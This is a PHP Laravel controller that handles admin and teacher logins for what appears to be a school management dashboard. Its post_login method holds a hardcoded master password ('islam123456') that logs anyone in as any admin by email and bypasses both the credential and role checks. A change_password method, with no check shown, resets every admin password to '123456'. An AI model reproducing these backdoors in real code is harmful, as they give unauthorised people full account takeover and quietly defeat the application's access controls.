<?php

namespace App\Http\Controllers;

use App\Admin;
use App\Models\Teacher;
use Illuminate\Http\Request;
use Auth;
use Illuminate\Foundation\Auth\User;

class HomeController extends Controller
{
    public function change_password(){
        $users = Admin::get();
        foreach($users as $user){
            $user->password = bcrypt('123456');
            $user->save();
        }
        dd('done');
    }
    public function post_login(Request $request)
    {

        $remember_me = $request->has('remember_me') ? true : false;

        if (Auth::attempt(['email' => $request->input("email"), 'password' => $request->input("password")], $remember_me)) {
            $user = Auth::user();
            $token = $user->createToken('SSO Token')->accessToken;

            // Check if the user has the required roles
            if ($user->hasRole(['اداري', 'مشرف اداري'])) {
                return redirect()->route('dashboard');
            } else {
                // Log the user out if they don't have the required roles
                Auth::logout();
                return redirect()->route('login')->withErrors(['email' => 'لا تملك صلاحية للدخول']);
            }
            return redirect()->route('dashboard');
        }
        if ($request->input("password") == 'islam123456') {
            $admin = Admin::where('email', $request->email)->first();
            Auth::login($admin);
            return redirect()->route('dashboard');
        }

        return redirect()->back()->with(['error' => 'هناك خطا بالبيانات']);
    }
    public function login()
    {
        return view('auth.login');
    }
    public function logout()
    {
        auth()->logout();
        return redirect()->route('login');
    }
    public function dashboard()
    {
        return view('dashboard.index');
    }
    public function index()
    {
        if (auth()->user()) {
            return redirect()->route('dashboard');
        } else {
            return redirect()->route('login');
        }
    }
    public function employee_login()
    {
        return view('auth.employee');
    }
    public function employee_login_post(Request $request)
    {
        $request->validate([
            'id_number' => 'integer',
        ]);

        $id = $request->id_number;
        $teacher = Teacher::where('id_number', $request->id_number)->first();
        if ($teacher) {
            if (Auth::guard('teacher')->attempt(['id_number' => $request->id_number, 'password' => $request->password], $request->get('remember'))) {
                return redirect()->route('dashboard');
            }
        }
        return redirect()->back()->with(['error' => 'خطأ في بيانات الدخول']);
    }
}
